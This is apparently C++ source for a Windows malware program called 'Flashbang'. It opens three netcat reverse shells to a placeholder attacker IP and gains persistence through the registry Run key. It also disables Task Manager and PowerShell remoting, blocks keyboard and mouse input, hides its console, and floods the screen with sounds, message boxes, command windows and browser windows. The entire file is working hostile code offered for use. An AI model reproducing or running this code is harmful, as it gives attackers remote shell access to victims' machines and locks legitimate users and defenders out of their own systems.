#include <iostream>
#include "mingw.thread.h"
//Switch to <thread> if not compiling over mingw
using namespace std;
#include <windows.h>
#include <winable.h>
#include <winuser.h>
#include <mmsystem.h>
#include <string.h>
#include <strings.h>

//COMPILE INSTRUCTIONS:
//g++ flashbang.cpp -lwinmm -D _WIN32_WINNT=0x0601

//Punch holes out with reverse shells to attacker
void holepunch(){
    //Reverse Shell Call #1 to attacker box over port 5555 
    string port1 = "nc.exe [ATTACKER IP] 5555 -e cmd.exe";
    const char *command1 = port1.c_str(); 
    //Reverse Shell Call #1 to attacker box over port 5555 
    string port2 = "nc.exe [ATTACKER IP] 7777 -e cmd.exe";
    const char *command2 = port2.c_str(); 
    //Reverse Shell Call #1 to attacker box over port 5555 
    string port3 = "nc.exe [ATTACKER IP] 9999 -e cmd.exe";
    const char *command3 = port3.c_str(); 
    system(command1);
    system(command2);
    system(command3);
}

//Establish persistent annoyance with an autoruns registry key
void persistance(){
    char buf[MAX_PATH];
    GetModuleFileName(NULL, buf, MAX_PATH);
    HKEY persistKey;
    LONG lnRes = RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0,KEY_WRITE, &persistKey);
    if( ERROR_SUCCESS == lnRes ){
        lnRes = RegSetValueEx(persistKey, "Flashbang", 0, REG_SZ, (BYTE*)buf, strlen(buf));
    }
}

//Disable user input until broken via CTR+ALT+DEL
void BlockUserInput(){
    while(true){
        BlockInput(true);
    }
}

//Disable Task Manager if they use CTR+ALT+DEL to escape
void DisableTaskManager(){
    string str = "Reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f";
    const char *command = str.c_str(); 
    system(command);
}

//Disable Remote PowerShell Access to the box
void disableRemotePowerShell(){
    string str = "powershell.exe Disable-PSRemoting -Force";
    const char *command = str.c_str();
    system(command);
}

//Spam annoying music to operator
void musicspam(){
    while(true){
        string sound = "PlaySound(TEXT(\"lul1.wav\"), NULL, SND_SYNC)";
        PlaySound(TEXT("lul1.wav"), NULL, SND_SYNC);
    }
}

void boxspam(){
    while(true){
        MessageBoxA(NULL, "YOU'VE BEEN OWNED!", "Think Fast!", MB_ICONWARNING | MB_OK);
    }
}

//Spam their desktop with browsers connecting to sites of your choice
void browserTextSpam(){
    string str = "start iexplore.exe http://";
    string str2 = "start iexplore.exe http://";
    string str3 = "start iexplore.exe http://";
    string str4 = "start iexplore.exe http://";
    string str5 = "start iexplore.exe http://";
    const char* A = str.c_str();
    const char* B = str2.c_str();
    const char* C = str3.c_str();
    const char* D = str4.c_str();
    const char* E = str5.c_str();
    //Connect to website A
    system(A);
    //Connect to website B
    system(B);
    //Connect to website C
    system(C);
    //Connect to website D
    system(D);
    //Connect to website E
    system(E);
}

int main(){
    //Set persistent running in registry
    persistance();
    holepunch()
    FreeConsole();  //Hide the console
    DisableTaskManager();
    disableRemotePowerShell();
    //Looped threads
    std::thread T1(musicspam);
    std::thread T2(boxspam);
    std::thread T3(BlockUserInput);
    //Loop full of obstructions
    while(true){
        BlockUserInput();
        STARTUPINFOA si = {sizeof(STARTUPINFO)};
        PROCESS_INFORMATION pi;
        CreateProcessA( "C:\\Windows\\System32\\cmd.exe",
                    NULL, 
                    NULL, NULL, 0, 0, NULL, NULL, &si, &pi);
        browserTextSpam();
        Sleep(1000);
    }
    return 0;
}
